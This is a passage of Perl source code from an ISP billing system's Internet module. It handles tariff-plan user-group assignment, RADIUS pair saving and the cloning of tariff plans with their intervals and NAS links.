#**********************************************************
sub group_tp_user_groups {

  $Tariffs->tp_group_info($FORM{ID});

  if (!$FORM{ID} || $Tariffs->{TOTAL} < 1) {
    $html->message('err', $lang{ERROR}, "Не выбрана группа!");
    return 1;
  }

  my $tp_name = $Tariffs->{NAME};
  
  if ($FORM{change}) {
    $Tariffs->del_tp_group_users_groups({ TP_GID => $FORM{ID} });
    for my $group (split(',\s?', $FORM{GID} ? $FORM{GID} : '')) {
      $Tariffs->add_tp_group_users_groups({ TP_GID => $FORM{ID}, GID => $group });
    }
    $html->message('info', $lang{CHANGED}, "$lang{CHANGED} $lang{GROUPS}: $tp_name");
  }
  elsif ($FORM{ID}) {
    my $tp_info = $Tariffs->tp_group_users_groups_info({
      TP_GID    => $FORM{ID},
      GIDS      => '_SHOW',
      GROUP_BY  => 'GROUP BY tpug.tp_gid',
      COLS_NAME => 1
    });

    $FORM{GID} = $tp_info->[0]{gids} if $Tariffs->{TOTAL} > 0 && $tp_info->[0]{gids};
  }

  $html->tpl_show(_include('internet_users_group_sel_form', 'Internet'), {
    GROUP_SEL  => sel_groups({ FILTER_SEL => 1 }),
    GROUP_NAME => $html->button($tp_name,  'get_index=form_tp_groups&full=1&header=1&chg=' . $FORM{ID})
  });

  return 1;
}

#**********************************************************
=head2 tp_radius_pairs_save($attr)

  Arguments:

  Return:

=cut
#**********************************************************
sub tp_radius_pairs_save {

  return 1 if !$FORM{ID};

  $Tariffs->change($FORM{ID}, {
    %{$Tariffs->info($FORM{ID})},
    TP_ID     => $FORM{ID},
    RAD_PAIRS => AXbills::Radius_Pairs::parse_radius_params_json($FORM{RADIUS_PAIRS})
  });

  print AXbills::Radius_Pairs::build_radius_params_result_response($Tariffs);

  return 1;
}


#**********************************************************
=head2 internet_tp_clone($attr)

  Arguments:

  Return:

=cut
#**********************************************************
sub internet_tp_clone {

  if ($FORM{ADD_CLONE_TP}) {
    my $clone_tp = $Tariffs->list({
      TP_ID            => $FORM{INTERNET_TP_SELECT},
      SHOW_ALL_COLUMNS => 1,
      COLS_NAME        => 1,
      COLS_UPPER       => 1
    });
    return if !$Tariffs->{TOTAL};

    _internet_tp_clone_add_tp($clone_tp->[0], \%FORM);
    return;
  }

  my $internet_tp_index = get_function_index('internet_tp');
  my $tp_select = $html->form_select('INTERNET_TP_SELECT', {
    SEL_LIST => $Tariffs->list({
      MODULE       => 'Dv;Internet',
      DOMAIN_ID    => $admin->{DOMAIN_ID} || '',
      NEW_MODEL_TP => 1,
      COLS_NAME    => 1
    }),
    SELECTED => $FORM{TP_ID} || '',
  });

  $html->tpl_show(_include('internet_tp_clone', 'Internet'), {
    INTERNET_TP_SELECT => $tp_select,
    INDEX              => $internet_tp_index,
    %FORM
  });

  return 0;
}

#**********************************************************
=head2 _internet_tp_clone_add_tp($attr)

  Arguments:

  Return:

=cut
#**********************************************************
sub _internet_tp_clone_add_tp {
  my ($clone_tp, $attr) = @_;

  my $new_ti = $Tariffs->ti_list({ TP_ID => $clone_tp->{TP_ID}, COLS_NAME => 1, COLS_UPPER => 1 });
  delete $clone_tp->{ID};
  $clone_tp->{NAME} = $attr->{NAME} ? $attr->{NAME} : $clone_tp->{NAME} . '_CLONE';
  $clone_tp->{ALERT} = $clone_tp->{UPLIMIT} || '';
  $clone_tp->{SIMULTANEOUSLY} = $clone_tp->{LOGINS} || '';
  $clone_tp->{NEXT_TARIF_PLAN} = $clone_tp->{NEXT_TP_ID} || '';
  $clone_tp->{ACTIV_PRICE} = $clone_tp->{ACTIVATE_PRICE} || '';
  $clone_tp->{POSTPAID_MONTH_FEE} = $clone_tp->{POSTPAID_MONTHLY_FEE} || '';

  if ($attr->{TP_ID}) {
    $clone_tp->{TP_ID} = $attr->{TP_ID};
    $Tariffs->change($attr->{TP_ID}, $clone_tp);

    return if _error_show($Tariffs);

    my $old_ti = $Tariffs->ti_list({ TP_ID => $attr->{TP_ID}, COLS_NAME => 1, COLS_UPPER => 1 });
    map $Tariffs->ti_del($_->{ID}), @{$old_ti} if $Tariffs->{TOTAL};

    foreach (@{$new_ti}) {
      $Tariffs->{TP_ID} = $attr->{TP_ID};
      my $added_ti = $Tariffs->ti_add({
        TI_DAY   => $_->{DAY},
        TI_BEGIN => $_->{BEGIN},
        TI_END   => $_->{END},
        TI_TARIF => $_->{TARIF},
      });

      my $tt_list = $Tariffs->tt_list({ TI_ID => $_->{ID}, COLS_NAME => 1, COLS_UPPER => 1 });
      foreach my $tt (@{$tt_list}) {
        $Tariffs->tt_add({
          tt    => $added_ti->{INTERVAL_ID},
          TP_ID => $attr->{TP_ID},
          %{$tt}
        });
      }
    }

    $Tariffs->{TP_ID} = $clone_tp->{tp_id};
    my $nas_list = $Tariffs->nas_list();

    if ($Tariffs->{TOTAL} > 0) {
      $Tariffs->{TP_ID} = $attr->{TP_ID};
      $Tariffs->nas_add([ map {$_->[0]} @{$nas_list} ]);
    }

    $FORM{TP_ID} = $attr->{TP_ID};

    $html->message('info', "$lang{TARIF_PLAN} $lang{SUCCESSFULLY_CLONED}");
    return;
  }

  delete $clone_tp->{TP_ID};
  my $new_tp = $Tariffs->add($clone_tp);

  return if _error_show($Tariffs);
  my $tp_id = $new_tp->{INSERT_ID};

  foreach (@{$new_ti}) {
    $Tariffs->{TP_ID} = $new_tp->{TP_ID};
    my $added_ti = $Tariffs->ti_add({
      TI_DAY   => $_->{DAY},
      TI_BEGIN => $_->{BEGIN},
      TI_END   => $_->{END},
      TI_TARIF => $_->{TARIF},
    });

    my $tt_list = $Tariffs->tt_list({ TI_ID => $_->{ID}, COLS_NAME => 1, COLS_UPPER => 1 });
    foreach my $tt (@{$tt_list}) {
      $Tariffs->tt_add({
        tt    => $added_ti->{INTERVAL_ID},
        TP_ID => $new_tp->{TP_ID},
        %{$tt}
      });
    }

    $Tariffs->{TP_ID} = $clone_tp->{tp_id};
    my $nas_list = $Tariffs->nas_list();

    if ($Tariffs->{TOTAL} > 0) {
      $Tariffs->{TP_ID} = $tp_id;
      $Tariffs->nas_add([ map {$_->[0]} @{$nas_list} ]);
    }
  }
  $FORM{TP_ID} = $new_tp->{TP_ID};

  $html->message('info', "$lang{TARIF_PLAN} $lang{SUCCESSFULLY_CLONED}");
  return;
}

1;